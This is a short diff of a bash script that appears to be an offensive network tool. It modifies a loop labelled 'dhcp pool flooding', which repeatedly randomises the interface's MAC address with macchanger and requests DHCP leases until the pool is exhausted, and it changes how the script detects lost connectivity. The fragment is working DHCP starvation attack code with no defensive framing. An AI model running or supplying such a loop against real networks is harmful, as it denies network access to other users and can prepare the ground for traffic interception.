@@ -192,19 +192,15 @@ if [ $ask -eq 5 ]
 				sudo macchanger -a $inter
 				sudo ifconfig $inter up 
 				sleep 4
-				sudo dhclient $inter
+				sudo dhclient -1 $inter
+				if [ $? -eq 2 ]
+					then
+						online=0
+				fi
 				((cnt++))
 				clear
 				date=$(date)
 				echo $cnt "DHCP leases gathered" $date
-				sleep 2
-				#check online start 
-				ping -c 1 $gate > /dev/null
-				if [ $? -eq 1 ]
-					then
-						online=0
-				fi
-				#check online end
 		done
 		#end dhcp pool flooding
 		sudo hostname $resethost
